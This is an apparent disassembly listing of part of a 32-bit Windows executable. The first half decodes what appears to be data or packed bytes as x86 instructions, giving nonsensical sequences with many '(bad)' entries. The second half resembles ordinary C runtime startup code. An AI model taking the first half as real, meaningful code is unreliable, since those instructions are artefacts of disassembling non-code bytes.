  42248b:	test   DWORD PTR [edi+0x65c0aca6],0x3b17da28
  422495:	fisubr WORD PTR [edx]
  422497:	into   
  422498:	pusha  
  422499:	(bad)  
  42249a:	clc    
  42249b:	xlat   BYTE PTR ds:[ebx]
  42249c:	icebp  
  42249d:	stos   DWORD PTR es:[edi],eax
  42249e:	idiv   eax
  4224a0:	and    eax,0x4a4ba265
  4224a5:	stc    
  4224a6:	mov    eax,0xa97e52f7
  4224ab:	jo     0x4224fc
  4224ad:	and    BYTE PTR [esi],bl
  4224af:	test   eax,0x5ecd95b6
  4224b4:	jbe    0x42245b
  4224b6:	pop    eax
  4224b7:	cmp    ebp,ecx
  4224b9:	ins    BYTE PTR es:[edi],dx
  4224ba:	jmp    0x422491
  4224bc:	push   cs
  4224bd:	mov    al,ds:0x2a031c77
  4224c2:	mov    BYTE PTR [ebp+0x7d],dh
  4224c5:	imul   edx,edx,0x8
  4224c8:	pop    esp
  4224c9:	and    BYTE PTR ss:[ecx],bl
  4224cc:	pop    esp
  4224cd:	mov    edx,0xc1d593d5
  4224d2:	test   DWORD PTR [edi+0x428c40c1],ecx
  4224d8:	ret    
  4224d9:	fidiv  DWORD PTR [ebx]
  4224db:	iret   
  4224dc:	push   edi
  4224dd:	(bad)  
  4224de:	xor    BYTE PTR [edx+edi*4],cl
  4224e1:	mov    ebp,0x870e09c7
  4224e6:	adc    eax,ebp
  4224e8:	(bad)  
  4224e9:	(bad)  
  4224ea:	ror    ebx,0x82
  4224ed:	daa    
  4224ee:	fnstsw WORD PTR [ecx+0x409562ad]
  4224f4:	push   ds
  4224f5:	jnp    0x4224d9
  4224f7:	mov    cl,0x6c
  4224f9:	mov    edx,0x47286aa1
  4224fe:	in     al,0xd6
  422500:	pusha  
  422501:	push   ebp
  422502:	xchg   edx,eax
  422503:	xor    eax,DWORD PTR ss:[esi+ebx*4-0x3eefaa16]
  42250b:	bound  edi,QWORD PTR [edx-0x52]
  42250e:	(bad)
  422511:	jo     0x422513
  422513:	ins    DWORD PTR es:[edi],dx
  422514:	ds xchg ecx,eax
  422516:	sub    esi,DWORD PTR [esi+0x3]
  422519:	shl    BYTE PTR [eax+0x282b7096],cl
  42251f:	(bad)  
  422520:	inc    edx
  422521:	leave  
  422522:	push   ebp
  422523:	cdq    
  422524:	jecxz  0x4225a0
  422526:	lods   al,BYTE PTR ds:[esi]
  422527:	mov    ebp,0x180f8558
  42252c:	les    ecx,FWORD PTR [edx-0x2bd0b13f]
  422532:	adc    cl,BYTE PTR [ebp+edi*8+0x5efb972d]
  422539:	pop    ebp
  42253a:	nop
  42253b:	jg     0x4225b8
  42253d:	scas   al,BYTE PTR es:[edi]
  42253e:	add    eax,esp
  422540:	push   ecx
  422541:	dec    esi
  422542:	dec    ebx
  422543:	(bad)  
  422544:	cwde   
  422545:	add    bl,bh
  422547:	dec    ebp
  422548:	add    bh,BYTE PTR [edx+eax*8-0x70]
  42254c:	and    BYTE PTR [ecx-0x51f5e62],ch
  422552:	push   ss
  422553:	dec    esi
  422554:	xlat   BYTE PTR ds:[ebx]
  422555:	in     eax,dx
  422556:	imul   esp,DWORD PTR [ebx+0x6b1e87],0xffffffac
  42255d:	lock bound ecx,QWORD PTR [esi+0x11]
  422561:	or     al,0x14
  422563:	or     bl,BYTE PTR [ebp+0x26081a94]
  422569:	push   ebx
  42256a:	jae    0x42258d
  42256c:	adc    ch,BYTE PTR [eax+0x623b554b]
  422572:	xor    cl,bh
  422574:	(bad)  
  422575:	mov    eax,edi
  422577:	call   0x8efd:0x76b7a0e1
  42257e:	(bad)  
  42257f:	(bad)  
  422580:	sbb    al,0x9f
  422582:	push   esi
  422583:	scas   al,BYTE PTR es:[edi]
  422584:	add    BYTE PTR [eax+0x1b389a95],dl
  42258a:	adc    edi,DWORD PTR [edx-0x5a]
  42258d:	adc    al,0x35
  42258f:	inc    ebp
  422590:	cs (bad) 
  422593:	sub    BYTE PTR ss:[edi+eax*1],ah
  422597:	xchg   edx,eax
  422598:	pop    esp
  422599:	cdq    
  42259a:	sar    BYTE PTR [edx],cl
  42259c:	jnp    0x4225e2
  42259e:	jp     0x422568
  4225a0:	ror    DWORD PTR [ebx],1
  4225a2:	scas   eax,DWORD PTR es:[edi]
  4225a3:	ins    DWORD PTR es:[edi],dx
  4225a4:	cs pop edx
  4225a6:	sbb    BYTE PTR [esi-0x721685bc],dl
  4225ac:	int    0xdc
  4225ae:	bound  ebp,QWORD PTR es:[esi+eiz*4-0x6e]
  4225b3:	out    0xfc,eax
  4225b5:	add    BYTE PTR [eax+eiz*8+0x15],0xe8
  4225ba:	cmp    BYTE PTR cs:[eax],bh
  4225bd:	or     al,bl
  4225bf:	jp     0x42258f
  4225c1:	loope  0x4225fc
  4225c3:	rcl    BYTE PTR [esi+0x22],cl
  4225c6:	sar    DWORD PTR [ebx-0x1],cl
  4225c9:	jp     0x422584
  4225cb:	aaa    
  4225cc:	out    0xd0,eax
  4225ce:	dec    edx
  4225cf:	and    DWORD PTR [ecx],edi
  4225d1:	bnd call 0x52398be4
  4225d7:	add    dl,BYTE PTR [ebp-0x66c864d9]
  4225dd:	mov    edi,0xf8e7e42a
  4225e2:	push   ds
  4225e3:	dec    esi
  4225e4:	shr    DWORD PTR [esi+edi*4],0x4d
  4225e8:	jae    0x422634
  4225ea:	popf   
  4225eb:	nop
  4225ec:	and    edi,DWORD PTR [esi-0x30e67966]
  4225f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225f3:	cmp    ebp,DWORD PTR [ebx-0x10]
  4225f6:	repnz sbb esi,DWORD PTR [ebp-0x579b6309]
  4225fd:	adc    BYTE PTR [bp+di-0x3649],al
  422602:	icebp  
  422603:	test   BYTE PTR [ecx],ah
  422605:	jbe    0x422612
  422607:	test   DWORD PTR [edx],edi
  422609:	inc    edx
  42260a:	mov    dh,0x9f
  42260c:	jg     0x42261e
  42260e:	xor    ah,BYTE PTR [esi]
  422610:	xchg   ebp,eax
  422611:	cmc    
  422612:	lock fadd QWORD PTR [edx]
  422615:	jae    0x422607
  422617:	mov    bl,0xa0
  422619:	and    cl,BYTE PTR [ebx]
  42261b:	inc    edx
  42261c:	test   al,0xf8
  42261e:	aad    0xfd
  422620:	retf   0xbad
  422623:	jg     0x4225d9
  422625:	ss pop edi
  422627:	stc    
  422628:	shl    dl,0x3a
  42262b:	jns    0x4225b6
  42262d:	xchg   esp,eax
  42262e:	lahf   
  42262f:	imul   esp,ecx,0xffffffb3
  422632:	hlt    
  422633:	and    DWORD PTR [esi],edx
  422635:	xor    ebx,ebx
  422637:	mov    bh,0x46
  422639:	jns    0x4226a6
  42263b:	out    dx,eax
  42263c:	mov    al,fs:0x7163a08
  422642:	cmp    ecx,DWORD PTR [eax+0x7f82902a]
  422648:	jle    0x4225cc
  42264a:	or     al,0xcd
  42264c:	inc    edi
  42264d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264e:	inc    ebx
  42264f:	lahf   
  422650:	sbb    DWORD PTR [ebp+0x1e],edi
  422653:	pop    ebx
  422654:	ins    DWORD PTR es:[edi],dx
  422655:	adc    BYTE PTR [ebp+0x49],al
  422658:	fist   DWORD PTR [ebp-0x3bfc092c]
  42265e:	mov    ds:0x7184f11c,eax
  422663:	mov    BYTE PTR [edx],bh
  422665:	cs and eax,0xe478a3e9
  42266b:	jne    0x422652
  42266d:	retf   0xd21b
  422670:	push   ebx
  422671:	mov    ah,0x3e
  422673:	cmp    DWORD PTR [ebx],edi
  422675:	scas   al,BYTE PTR es:[edi]
  422676:	shl    BYTE PTR [esi+0x29],cl
  422679:	inc    ecx
  42267a:	jo     0x422643
  42267c:	mov    dl,0xdb
  42267e:	adc    al,0x2b
  422680:	in     eax,dx
  422681:	(bad)  
  422682:	dec    ebx
  422683:	cli    
  422684:	(bad)  
  422685:	les    edx,FWORD PTR [ecx-0x51]
  422688:	push   esi
  422689:	sub    esp,DWORD PTR [ecx+0x4f41e392]
  42268f:	inc    ecx
  422690:	sbb    BYTE PTR [edi+0x76],bl
  422693:	sbb    eax,0x79696c93
  422698:	test   edx,esp
  42269a:	dec    edi
  42269b:	fs push es
  42269d:	je     0x422684
  42269f:	outs   dx,DWORD PTR ds:[esi]
  4226a0:	inc    ebp
  4226a1:	nop
  4226a2:	lock icebp 
  4226a4:	push   ss
  4226a5:	mov    ebp,0x63dcf942
  4226aa:	ss ss in eax,0x8e
  4226ae:	ins    BYTE PTR es:[edi],dx
  4226af:	aam    0x24
  4226b1:	arpl   WORD PTR [ecx-0x6680ccd1],cx
  4226b7:	xor    eax,0x73164178
  4226bc:	ds mov ebp,0x79fc6826
  4226c2:	scas   eax,DWORD PTR es:[edi]
  4226c3:	mov    al,0xd4
  4226c5:	xchg   edi,eax
  4226c6:	jmp    0x6d8bfad5
  4226cb:	xor    BYTE PTR ds:0xe32d900b,dh
  4226d1:	mov    al,0x52
  4226d3:	ficom  WORD PTR [eax-0x5e1ba18e]
  4226d9:	mov    al,ds:0x4b08a788
  4226de:	mov    bh,0xc7
  4226e0:	add    bl,BYTE PTR [ebp+0x1d]
  4226e3:	cmp    eax,0xbc39702a
  4226e8:	and    al,0x27
  4226ea:	shl    BYTE PTR ss:[ebp-0x6f],1
  4226ee:	nop
  4226ef:	xor    eax,0x38ee126d
  4226f4:	shl    esp,cl
  4226f6:	retf   
  4226f7:	jb     0x4226e0
  4226f9:	push   esp
  4226fa:	or     DWORD PTR [eax-0x40],esp
  4226fd:	fucom  st(5)
  4226ff:	shr    DWORD PTR [eax+0x5cb69d2c],cl
  422705:	mov    DWORD PTR [edx],edx
  422707:	mov    ebp,DWORD PTR [eax-0x5a86af3a]
  42270d:	xor    cl,ch
  42270f:	dec    edi
  422710:	jno    0x42277d
  422712:	lock (bad) 
  422714:	push   0xea74c33d
  422719:	sti    
  42271a:	xchg   ebx,eax
  42271b:	mov    ebp,0xfeeff288
  422720:	jo     0x42270a
  422722:	das    
  422723:	and    al,0xb3
  422725:	adc    DWORD PTR fs:[eax],ebx
  422728:	adc    esp,DWORD PTR [esi-0x23]
  42272b:	scas   eax,DWORD PTR es:[edi]
  42272c:	stc    
  42272d:	mov    WORD PTR [ecx-0x6d],?
  422730:	and    esi,esi
  422732:	cmp    al,0xdd
  422734:	pusha  
  422735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422736:	pop    ss
  422737:	mov    ecx,DWORD PTR cs:[edx]
  42273a:	stos   DWORD PTR es:[edi],eax
  42273b:	push   0x3c
  42273d:	fdivr  st,st(6)
  42273f:	mov    dh,0x5d
  422741:	ja     0x422704
  422743:	stos   DWORD PTR es:[edi],eax
  422744:	pop    ds
  422745:	std    
  422746:	leave  
  422747:	icebp  
  422748:	rol    DWORD PTR [edx-0x17cb67ea],cl
  42274e:	mov    ds:0x2ed2a9c8,eax
  422753:	mov    edi,0x80046ce6
  422758:	lods   eax,DWORD PTR ds:[esi]
  422759:	call   0x94d4:0x82b2892d
  422760:	mov    BYTE PTR [ecx],cl
  422762:	and    eax,0x3a5c5169
  422767:	push   eax
  422768:	popa   
  422769:	xchg   DWORD PTR [edi],eax
  42276b:	jecxz  0x422725
  42276d:	sbb    eax,0x326db90a
  422772:	lods   al,BYTE PTR ds:[esi]
  422773:	cmp    BYTE PTR [eax+0x9d8ccc7],cl
  422779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42277a:	mov    edx,0xa8d9f26c
  42277f:	aad    0xc9
  422781:	xor    esp,eax
  422783:	cmp    DWORD PTR [eax+eiz*1-0x76502433],ebx
  42278a:	cmp    eax,0xd74e989
  42278f:	sub    BYTE PTR [edx],bl
  422791:	jne    0x422792
  422793:	jmp    0xb6b6294c
  422798:	mov    DWORD PTR [ebp-0x2ee38a7],edx
  42279e:	pusha  
  42279f:	mov    ah,0xa3
  4227a1:	(bad)  
  4227a2:	add    esi,edx
  4227a4:	lods   al,BYTE PTR ds:[esi]
  4227a5:	mov    BYTE PTR [esi+eiz*1],cl
  4227a8:	repnz and dl,al
  4227ab:	jne    0x4227e1
  4227ad:	push   cs
  4227ae:	loope  0x42277c
  4227b0:	leave  
  4227b1:	push   es
  4227b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227b3:	cs jmp 0x6e30:0x1eb6577f
  4227bb:	mov    ah,0xcc
  4227bd:	mov    dh,0x92
  4227bf:	add    eax,0x11d65c
  4227c4:	sbb    ebx,DWORD PTR [ebx]
  4227c6:	cmp    edx,DWORD PTR [eax-0x10]
  4227c9:	add    BYTE PTR [ecx+0x7f],ah
  4227cc:	fs enter 0x45b5,0x5c
  4227d1:	adc    al,BYTE PTR [esi-0x3ec13b1]
  4227d7:	jecxz  0x4227c6
  4227d9:	loop   0x4227a5
  4227db:	mov    bl,0x6a
  4227dd:	dec    eax
  4227de:	lea    esp,[ebp+0x4f0d1f9a]
  4227e4:	lea    ebp,[esi*8+0x1a51251f]
  4227eb:	jno    0x4227c2
  4227ed:	rcr    DWORD PTR [esp+ebp*1-0x31],1
  4227f1:	sahf   
  4227f2:	(bad)  
  4227f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f4:	dec    esi
  4227f5:	addr16 sahf 
  4227f7:	mov    ds,ecx
  4227f9:	adc    eax,0x3e3f562e
  4227fe:	enter  0x70ac,0x3d
  422802:	pop    esi
  422803:	not    BYTE PTR [ebp+0x7842eb64]
  422809:	cmp    esi,DWORD PTR [edx-0x76]
  42280c:	or     bh,cl
  42280e:	xor    BYTE PTR [ebx+0x33d1d5e1],dl
  422814:	jmp    0x3224ce75
  422819:	in     eax,dx
  42281a:	inc    ebp
  42281b:	(bad)  
  42281c:	sbb    BYTE PTR [ecx-0xf],0xe2
  422820:	fcomp  QWORD PTR [ebx+ebp*8]
  422823:	push   edx
  422824:	stc    
  422825:	imul   edi,DWORD PTR [edi+0x39],0x6ce9df91
  42282c:	and    al,0x4a
  42282e:	xor    dl,BYTE PTR [ebx]
  422830:	mov    edx,0x673308cc
  422835:	fidivr WORD PTR [eax+0x4]
  422838:	(bad)  [edi+edi*4-0x7f101e28]
  42283f:	dec    esi
  422840:	stos   BYTE PTR es:[edi],al
  422841:	loope  0x4227cc
  422843:	mov    ebx,0xad4ef0ba
  422848:	repnz (bad) 
  42284a:	adc    al,0x50
  42284c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42284d:	jp     0x4227ec
  42284f:	pop    edi
  422850:	mov    dh,0x2e
  422852:	call   0x2263464
  422857:	lods   eax,DWORD PTR ds:[esi]
  422858:	(bad)  [ebp-0x7f63559]
  42285e:	or     bl,bh
  422860:	fsubr  QWORD PTR [ebp+0x31]
  422863:	cli    
  422864:	outs   dx,DWORD PTR ds:[esi]
  422865:	leave  
  422866:	(bad)  
  422868:	sbb    edi,DWORD PTR [edx]
  42286a:	sbb    eax,0x1bd0a5bb
  42286f:	jne    0x4228a8
  422871:	mov    ebx,esp
  422873:	in     eax,0xaf
  422875:	pushf  
  422876:	popa   
  422877:	inc    edi
  422878:	ins    DWORD PTR es:[edi],dx
  422879:	rol    DWORD PTR [eax+0x36d9094e],1
  42287f:	ja     0x4228a2
  422881:	sub    esp,0xffffff94
  422884:	pop    ss
  422885:	and    al,ah
  422887:	mov    al,0x63
  422889:	out    0xd3,eax
  42288b:	add    BYTE PTR [edx+0x35f9e25a],ah
  422891:	das    
  422892:	push   es
  422893:	mov    ah,0xc0
  422895:	arpl   sp,dx
  422897:	(bad)  
  422899:	jecxz  0x422850
  42289b:	xchg   ebp,eax
  42289c:	pop    ebp
  42289d:	(bad)  
  42289e:	and    eax,DWORD PTR [edi+ebp*2]
  4228a1:	repnz mov bh,0xaa
  4228a4:	jmp    0xc233:0x920747c3
  4228ab:	xchg   DWORD PTR [ecx-0x55],edx
  4228ae:	jb     0x422882
  4228b0:	jo     0x42284c
  4228b2:	popa   
  4228b3:	cli    
  4228b4:	das    
  4228b5:	(bad)  
  4228b6:	fdivr  DWORD PTR [ebp+0x0]
  4228b9:	sbb    DWORD PTR [eax],0x30a503ec
  4228bf:	mov    esp,0x7ef5387c
  4228c4:	(bad)  
  4228c5:	mov    edx,0x8d086947
  4228ca:	jg     0x4228dd
  4228cc:	in     al,dx
  4228cd:	dec    edx
  4228ce:	imul   ebp,ebp,0x21
  4228d1:	into   
  4228d2:	inc    ecx
  4228d3:	mov    dl,dl
  4228d5:	or     esp,edi
  4228d7:	jp     0x4228aa
  4228d9:	sbb    DWORD PTR [edi],edi
  4228db:	mov    esi,0x52f57f52
  4228e0:	pop    es
  4228e1:	xor    BYTE PTR [eax+esi*2],dl
  4228e4:	rol    DWORD PTR [eax+edx*2],0x95
  4228e8:	push   es
  4228e9:	sub    esp,esi
  4228eb:	arpl   WORD PTR [eax-0x26bd53be],si
  4228f1:	xor    al,0x4
  4228f3:	test   DWORD PTR [esi-0x32],0x507905c5
  4228fa:	outs   dx,BYTE PTR ds:[esi]
  4228fb:	fstp   DWORD PTR [edx]
  4228fd:	sbb    BYTE PTR [ebx+0x6f165bc6],cl
  422903:	std    
  422904:	es mov edx,0x5bbc05ee
  42290a:	addr16 xchg edi,eax
  42290c:	dec    esp
  42290d:	cs lock enter 0xa53a,0x39
  422913:	pop    eax
  422914:	cmp    al,0x54
  422916:	(bad)  
  422917:	fwait
  422918:	push   eax
  422919:	xchg   ebx,eax
  42291a:	sar    BYTE PTR [ebp-0x1f],1
  42291d:	lds    ebp,FWORD PTR [edi-0x55]
  422920:	std    
  422921:	jmp    0xd377:0x9ee98906
  422928:	jl     0x4228b1
  42292a:	push   esp
  42292b:	jg     0x42292d
  42292d:	jg     0x42291e
  42292f:	loopne 0x422979
  422931:	add    dl,bh
  422933:	sbb    al,0x51
  422935:	sub    eax,esi
  422937:	add    al,0x30
  422939:	pop    esi
  42293a:	jo     0x4228db
  42293c:	pop    eax
  42293d:	out    0x41,al
  42293f:	and    BYTE PTR [ebx],dh
  422941:	nop
  422942:	push   edx
  422943:	int3   
  422944:	mov    ebp,0x71f5cdb4
  422949:	sub    BYTE PTR [edi],bh
  42294b:	dec    ebp
  42294c:	test   eax,0x6107a88d
  422951:	scas   eax,DWORD PTR es:[edi]
  422952:	cmc    
  422953:	mov    cl,0xa9
  422956:	cld    
  422957:	mov    dh,0xf6
  422959:	mov    DWORD PTR [edx+0x7d],edi
  42295c:	in     eax,dx
  42295d:	push   0x27
  42295f:	dec    esi
  422960:	adc    ebp,DWORD PTR [esi-0x35a6e4a]
  422966:	sbb    ah,al
  422968:	hlt    
  422969:	push   es
  42296a:	test   eax,0xb8deda30
  42296f:	and    al,0x33
  422971:	out    0x68,al
  422973:	adc    dl,BYTE PTR [ebp-0x5c367cf5]
  422979:	rcr    DWORD PTR [esi-0x60291f21],1
  42297f:	lock mov ecx,0x6339279f
  422985:	and    BYTE PTR [ebx+0x4b],al
  422988:	cmp    DWORD PTR [esi+0x14ac8abb],0x3ed34ca0
  422992:	inc    eax
  422993:	arpl   WORD PTR [esi-0x28c43c54],bx
  422999:	pop    edx
  42299a:	clc    
  42299b:	iret   
  42299c:	push   esp
  42299d:	ins    BYTE PTR es:[edi],dx
  42299e:	xor    eax,0x255f185b
  4229a3:	imul   esi,DWORD PTR [edx+0x78],0x48
  4229a7:	mov    eax,ds:0x133c6c68
  4229ac:	and    DWORD PTR [ecx+edi*1+0x6ee94478],esp
  4229b3:	inc    ecx
  4229b4:	push   esp
  4229b5:	jle    0x4229d6
  4229b7:	aas    
  4229b8:	(bad)  
  4229ba:	pop    ebp
  4229bb:	inc    esp
  4229bc:	sbb    DWORD PTR [edi-0x7c524549],edi
  4229c2:	mov    eax,DWORD PTR [ebp+0x567d7ac4]
  4229c8:	stos   DWORD PTR es:[edi],eax
  4229c9:	test   eax,0x8265d99b
  4229ce:	bound  edx,QWORD PTR [edx-0x46]
  4229d1:	xor    ch,BYTE PTR [esi]
  4229d3:	jle    0x422a34
  4229d5:	jne    0x422a0f
  4229d7:	inc    edi
  4229d8:	cmp    bl,BYTE PTR [ebx-0x13059661]
  4229de:	ja     0x4229e3
  4229e0:	mov    ds:0x87e2692,al
  4229e5:	and    dl,BYTE PTR [edi]
  4229e7:	addr16 sti 
  4229e9:	mov    ch,0xf0
  4229eb:	cmp    BYTE PTR [ecx+0x58391980],bh
  4229f1:	mov    eax,0xff006a11
  4229f6:	adc    eax,0x42813c
  4229fb:	push   0x0
  4229fd:	push   0x0
  4229ff:	call   DWORD PTR ds:0x428030
  422a05:	xor    eax,eax
  422a07:	add    esp,0x10
  422a0a:	ret    0x10
  422a0d:	nop
  422a0e:	nop
  422a0f:	nop
  422a10:	jmp    DWORD PTR ds:0x428130
  422a16:	cmp    DWORD PTR ds:0x464d5c,0x1
  422a1d:	jne    0x422a24
  422a1f:	call   0x422f62
  422a24:	push   DWORD PTR [esp+0x4]
  422a28:	call   0x422deb
  422a2d:	push   0xff
  422a32:	call   DWORD PTR ds:0x46444c
  422a38:	pop    ecx
  422a39:	pop    ecx
  422a3a:	ret    
  422a3b:	cmp    DWORD PTR ds:0x464d5c,0x1
  422a42:	jne    0x422a49
  422a44:	call   0x422f62
  422a49:	push   DWORD PTR [esp+0x4]
  422a4d:	call   0x422deb
  422a52:	push   0xff
  422a57:	call   0x422c31
  422a5c:	pop    ecx
  422a5d:	pop    ecx
  422a5e:	ret    
  422a5f:	push   0x60
  422a61:	push   0x428168
  422a66:	call   0x423950
  422a6b:	mov    edi,0x94
  422a70:	mov    eax,edi
  422a72:	call   0x4239a0
  422a77:	mov    DWORD PTR [ebp-0x18],esp
  422a7a:	mov    esi,esp
  422a7c:	mov    DWORD PTR [esi],edi
  422a7e:	push   esi
  422a7f:	call   DWORD PTR ds:0x428068
  422a85:	mov    ecx,DWORD PTR [esi+0x10]
  422a88:	mov    DWORD PTR ds:0x464d64,ecx
  422a8e:	mov    eax,DWORD PTR [esi+0x4]
  422a91:	mov    ds:0x464d70,eax
  422a96:	mov    edx,DWORD PTR [esi+0x8]
  422a99:	mov    DWORD PTR ds:0x464d74,edx
  422a9f:	mov    esi,DWORD PTR [esi+0xc]
  422aa2:	and    esi,0x7fff
  422aa8:	mov    DWORD PTR ds:0x464d68,esi
  422aae:	cmp    ecx,0x2
  422ab1:	je     0x422abf
  422ab3:	or     esi,0x8000
  422ab9:	mov    DWORD PTR ds:0x464d68,esi
  422abf:	shl    eax,0x8
  422ac2:	add    eax,edx
  422ac4:	mov    ds:0x464d6c,eax
  422ac9:	xor    esi,esi
  422acb:	push   esi
  422acc:	mov    edi,DWORD PTR ds:0x428044
  422ad2:	call   edi
  422ad4:	cmp    WORD PTR [eax],0x5a4d
  422ad9:	jne    0x422afa
  422adb:	mov    ecx,DWORD PTR [eax+0x3c]
  422ade:	add    ecx,eax
  422ae0:	cmp    DWORD PTR [ecx],0x4550
  422ae6:	jne    0x422afa
  422ae8:	movzx  eax,WORD PTR [ecx+0x18]
  422aec:	cmp    eax,0x10b
  422af1:	je     0x422b12
  422af3:	cmp    eax,0x20b
  422af8:	je     0x422aff
  422afa:	mov    DWORD PTR [ebp-0x1c],esi
  422afd:	jmp    0x422b26
  422aff:	cmp    DWORD PTR [ecx+0x84],0xe
  422b06:	jbe    0x422afa
  422b08:	xor    eax,eax
  422b0a:	cmp    DWORD PTR [ecx+0xf8],esi
  422b10:	jmp    0x422b20
  422b12:	cmp    DWORD PTR [ecx+0x74],0xe
  422b16:	jbe    0x422afa
  422b18:	xor    eax,eax
  422b1a:	cmp    DWORD PTR [ecx+0xe8],esi
  422b20:	setne  al
  422b23:	mov    DWORD PTR [ebp-0x1c],eax
  422b26:	push   0x1
  422b28:	call   0x4238fd
  422b2d:	pop    ecx
  422b2e:	test   eax,eax
  422b30:	jne    0x422b3a
  422b32:	push   0x1c
  422b34:	call   0x422a3b
  422b39:	pop    ecx
  422b3a:	call   0x423874
  422b3f:	test   eax,eax
  422b41:	jne    0x422b4b
  422b43:	push   0x10
  422b45:	call   0x422a3b
  422b4a:	pop    ecx
  422b4b:	call   0x42375d
  422b50:	mov    DWORD PTR [ebp-0x4],esi
  422b53:	call   0x42355f
  422b58:	test   eax,eax
  422b5a:	jge    0x422b64
  422b5c:	push   0x1b
  422b5e:	call   0x422a16
  422b63:	pop    ecx
  422b64:	call   DWORD PTR ds:0x428064
  422b6a:	mov    ds:0x465514,eax
  422b6f:	call   0x42343d
  422b74:	mov    ds:0x464d54,eax
  422b79:	call   0x42339b
  422b7e:	test   eax,eax
  422b80:	jge    0x422b8a
  422b82:	push   0x8
  422b84:	call   0x422a16
  422b89:	pop    ecx
  422b8a:	call   0x423168
  422b8f:	test   eax,eax
  422b91:	jge    0x422b9b
  422b93:	push   0x9
  422b95:	call   0x422a16
  422b9a:	pop    ecx
  422b9b:	call   0x422c73
  422ba0:	mov    DWORD PTR [ebp-0x20],eax
  422ba3:	cmp    eax,esi
  422ba5:	je     0x422bae
  422ba7:	push   eax
  422ba8:	call   0x422a16
  422bad:	pop    ecx
  422bae:	mov    DWORD PTR [ebp-0x38],esi
  422bb1:	lea    eax,[ebp-0x64]
  422bb4:	push   eax
  422bb5:	call   DWORD PTR ds:0x428060
  422bbb:	call   0x4230ff
  422bc0:	mov    DWORD PTR [ebp-0x68],eax
  422bc3:	test   BYTE PTR [ebp-0x38],0x1
  422bc7:	je     0x422bcf
  422bc9:	movzx  eax,WORD PTR [ebp-0x34]
  422bcd:	jmp    0x422bd2
  422bcf:	push   0xa
  422bd1:	pop    eax
  422bd2:	push   eax
  422bd3:	push   DWORD PTR [ebp-0x68]
  422bd6:	push   esi
  422bd7:	push   esi
  422bd8:	call   edi
  422bda:	push   eax
  422bdb:	call   0x421880
  422be0:	mov    edi,eax
  422be2:	mov    DWORD PTR [ebp-0x6c],edi
  422be5:	cmp    DWORD PTR [ebp-0x1c],esi
  422be8:	jne    0x422bf0
  422bea:	push   edi
  422beb:	call   0x422dab
  422bf0:	call   0x422dcd
  422bf5:	jmp    0x422c22
  422bf7:	mov    eax,DWORD PTR [ebp-0x14]
  422bfa:	mov    ecx,DWORD PTR [eax]
  422bfc:	mov    ecx,DWORD PTR [ecx]
  422bfe:	mov    DWORD PTR [ebp-0x70],ecx
  422c01:	push   eax
  422c02:	push   ecx
  422c03:	call   0x422f9b
  422c08:	pop    ecx
  422c09:	pop    ecx
  422c0a:	ret    
  422c0b:	mov    esp,DWORD PTR [ebp-0x18]
  422c0e:	mov    edi,DWORD PTR [ebp-0x70]
  422c11:	cmp    DWORD PTR [ebp-0x1c],0x0
  422c15:	jne    0x422c1d
  422c17:	push   edi
  422c18:	call   0x422dbc
  422c1d:	call   0x422ddc
  422c22:	or     DWORD PTR [ebp-0x4],0xffffffff
  422c26:	mov    eax,edi
  422c28:	lea    esp,[ebp-0x7c]
  422c2b:	call   0x42398b
  422c30:	ret    
  422c31:	push   0x428184
  422c36:	call   DWORD PTR ds:0x428044
  422c3c:	test   eax,eax
  422c3e:	je     0x422c56
  422c40:	push   0x428174
  422c45:	push   eax
  422c46:	call   DWORD PTR ds:0x42804c
  422c4c:	test   eax,eax
  422c4e:	je     0x422c56
  422c50:	push   DWORD PTR [esp+0x4]
  422c54:	call   eax
  422c56:	push   DWORD PTR [esp+0x4]
  422c5a:	call   DWORD PTR ds:0x42806c
  422c60:	int3   
  422c61:	push   0x8
  422c63:	call   0x423b0f
  422c68:	pop    ecx
  422c69:	ret    
  422c6a:	push   0x8
  422c6c:	call   0x423a7b
  422c71:	pop    ecx
  422c72:	ret    
  422c73:	mov    eax,ds:0x465510
  422c78:	test   eax,eax
  422c7a:	je     0x422c7e
  422c7c:	call   eax
  422c7e:	push   esi
  422c7f:	push   edi
  422c80:	mov    ecx,0x42a00c
  422c85:	mov    edi,0x42a018
  422c8a:	xor    eax,eax
  422c8c:	cmp    ecx,edi
  422c8e:	mov    esi,ecx
  422c90:	jae    0x422ca9
  422c92:	test   eax,eax
  422c94:	jne    0x422cd5
  422c96:	mov    ecx,DWORD PTR [esi]
  422c98:	test   ecx,ecx
  422c9a:	je     0x422c9e
  422c9c:	call   ecx
  422c9e:	add    esi,0x4
  422ca1:	cmp    esi,edi
  422ca3:	jb     0x422c92
  422ca5:	test   eax,eax
  422ca7:	jne    0x422cd5
  422ca9:	push   0x4237a1
  422cae:	call   0x423c20
  422cb3:	mov    esi,0x42a000
  422cb8:	mov    eax,esi
  422cba:	mov    edi,0x42a008
  422cbf:	cmp    eax,edi
  422cc1:	pop    ecx
  422cc2:	jae    0x422cd3
  422cc4:	mov    eax,DWORD PTR [esi]
  422cc6:	test   eax,eax
  422cc8:	je     0x422ccc
  422cca:	call   eax
  422ccc:	add    esi,0x4
  422ccf:	cmp    esi,edi
  422cd1:	jb     0x422cc4
  422cd3:	xor    eax,eax
  422cd5:	pop    edi
  422cd6:	pop    esi
  422cd7:	ret    
  422cd8:	push   ebp
  422cd9:	mov    ebp,esp
  422cdb:	push   esi
  422cdc:	push   edi
  422cdd:	push   0x8
  422cdf:	call   0x423b0f
  422ce4:	xor    esi,esi
  422ce6:	inc    esi
  422ce7:	cmp    DWORD PTR ds:0x464da4,esi
  422ced:	pop    ecx
  422cee:	jne    0x422d00
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	call   DWORD PTR ds:0x428074
  422cf9:	push   eax
  422cfa:	call   DWORD PTR ds:0x428070
  422d00:	cmp    DWORD PTR [ebp+0xc],0x0
  422d04:	mov    al,BYTE PTR [ebp+0x10]
  422d07:	mov    DWORD PTR ds:0x464da0,esi
  422d0d:	mov    ds:0x464d9c,al
  422d12:	jne    0x422d66
  422d14:	mov    ecx,DWORD PTR ds:0x465508
  422d1a:	test   ecx,ecx
  422d1c:	je     0x422d47
